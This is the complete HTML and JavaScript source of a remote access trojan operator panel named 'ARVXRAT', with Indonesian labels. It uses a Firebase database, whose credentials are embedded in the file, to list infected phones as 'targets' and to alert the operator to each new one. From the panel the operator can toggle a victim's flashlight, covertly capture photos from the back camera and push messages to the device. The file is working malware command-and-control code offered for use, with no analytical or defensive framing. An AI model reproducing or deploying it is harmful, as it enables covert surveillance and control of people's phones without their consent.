<!DOCTYPE html>
<html>
<head>
    <title>ARVXRAT</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body { background:#0a0a0a; color:#00f2ff; font-family:sans-serif; padding:15px; }
        .notif { border: 2px solid #ff0055; background:rgba(255,0,85,0.1); padding:10px; margin-bottom:15px; display:none; border-radius:10px; animation: glow 1s infinite; }
        @keyframes glow { 50% { box-shadow: 0 0 10px #ff0055; } }
        .card { border: 1px solid #00f2ff; padding:15px; border-radius:15px; background:rgba(0,0,0,0.9); max-width: 500px; margin: auto; }
        button { background:transparent; border:1px solid #00f2ff; color:#00f2ff; padding:12px; margin:5px; width:46%; cursor:pointer; font-weight:bold; border-radius:5px; }
        button:hover { background:#00f2ff; color:#000; }
        #preview { width:100%; border:2px solid #00f2ff; margin-top:15px; display:none; border-radius:10px; box-shadow: 0 0 15px #00f2ff; }
        input { width:92%; padding:10px; margin-top:10px; background:#111; color:#fff; border:1px solid #333; border-radius:5px; }
    </style>
</head>
<body>
    <div id="newT" class="notif">
        <b style="color:#ff0055;">TARGET BARU NICK: <span id="nID"></span></b><br>
        NAMA HP: <span id="nDev"></span><br>
        <button onclick="selTarget(lastID)" style="width:100%; background:#ff0055; color:#fff; border:none; margin-top:5px;">KLIK BRO UNTUK CONTROL</button>
    </div>

    <div class="card">
        <h1 style="text-align:center; letter-spacing:2px; text-shadow: 0 0 10px #00f2ff;">ARVXRAT</h1>
        <div id="list">MENCARI TARGET...</div>
        
        <div id="pnl" style="display:none; border-top:1px solid #333; margin-top:20px; padding-top:15px;">
            <h3 id="st" style="color:#ff0055;">SELECTED: -</h3>
            <button onclick="send('flash','on')">🔦 SENTER ON</button>
            <button onclick="send('flash','off')">🔦 SENTER OFF</button>
            <button onclick="send('capture','now','capture')" style="width:96%; background:#ff0055; color:#fff; border:none;">📸 AMBIL FOTO BELAKANG</button>
            <img id="preview" src="">
            <input type="text" id="msg" placeholder="Ketik pesan alert...">
            <button onclick="sendMsg()" style="width:96%; margin-top:5px;">💬 KIRIM PESAN</button>
        </div>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
            authDomain: "rat-html.firebaseapp.com",
            databaseURL: "https://rat-html-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "rat-html"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        let activeID = null; let lastID = "";

        // Notif Target Baru
        db.ref('targets').limitToLast(1).on('child_added', (sn) => {
            lastID = sn.key; 
            document.getElementById('nID').innerText = lastID;
            document.getElementById('nDev').innerText = sn.val().name;
            document.getElementById('newT').style.display = "block";
        });

        // List Target Online
        db.ref('targets').on('value', (sn) => {
            const l = document.getElementById('list'); l.innerHTML = "<b>ONLINE TARGETS:</b><br>";
            sn.forEach((c) => { 
                l.innerHTML += `<div onclick="selTarget('${c.key}')" style="padding:12px; border-bottom:1px solid #222; cursor:pointer;">📱 ${c.val().name} [${c.key}]</div>`; 
            });
        });

        function selTarget(id) {
            activeID = id; 
            document.getElementById('pnl').style.display = 'block';
            document.getElementById('st').innerText = "SELECTED: " + id;
            document.getElementById('newT').style.display = "none";
            // Listener Foto (Auto Update)
            db.ref('reports/'+id).on('value', (s) => { 
                if(s.exists()){ const i=document.getElementById('preview'); i.src=s.val().photo; i.style.display='block'; }
            });
        }

        function send(t, s, ty="flash") {
            if(!activeID) return;
            db.ref('commands/'+activeID).set({ type: ty, status: s, time: Date.now() });
        }

        function sendMsg() {
            const m = document.getElementById('msg').value;
            if(!m) return;
            db.ref('commands/'+activeID).set({ type: 'msg', text: m });
        }
    </script>
</body>
</html>
